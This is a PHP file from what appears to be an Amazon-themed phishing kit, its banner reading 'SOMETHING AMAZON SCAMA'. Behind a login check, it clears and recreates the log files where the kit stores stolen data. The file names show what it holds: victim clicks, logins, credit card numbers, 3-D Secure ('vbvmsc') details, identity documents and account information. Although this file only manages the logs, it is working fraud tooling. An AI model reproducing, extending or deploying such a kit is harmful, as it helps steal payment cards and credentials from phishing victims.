<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
ob_start();
session_start();
ob_end_clean();
if(!isset($_SESSION['username'])){
header("location:login.php");
exit;
}
$file = $_GET["file"];
if($file=="click")
{
unlink("../logs/some-click.txt");
$handle = fopen("../logs/some-click.txt", 'a');
}else if($file=="login")
{
unlink("../logs/some-login.txt");
$handle = fopen("../logs/some-login.txt", 'a');
}else if($file=="cc")
{
unlink("../logs/some-cc.txt");
$handle = fopen("../logs/some-cc.txt", 'a');
}else if($file=="sampah")
{
unlink("../logs/some-log.txt");
$handle = fopen("../logs/some-log.txt", 'a');
}else if($file=="clearAll")
{
    unlink("../logs/some-click.txt");
    $handle = fopen("../logs/some-click.txt", 'a');
        unlink("../logs/some-login.txt");
        $handle = fopen("../logs/some-login.txt", 'a');
            unlink("../logs/some-cc.txt");
            $handle = fopen("../logs/some-cc.txt", 'a');
                unlink("../logs/some-vbvmsc.txt");
                $handle = fopen("../logs/some-vbvmsc.txt", 'a');
                unlink("../logs/some-id.txt");
                $handle = fopen("../logs/some-id.txt", 'a');
                    unlink("../logs/some-acc.log");
                    $handle = fopen("../logs/some-acc.log", 'a');
                    unlink("../logs/some-cc.log");
                    $handle = fopen("../logs/some-cc.log", 'a');
                            unlink("../logs/some-log.txt");
                            $handle = fopen("../logs/some-log.txt", 'a');
                                unlink("../logs/login-info.txt");
                                $handle = fopen("../logs/login-info.txt", 'a');
}
header("Location: ./");
?>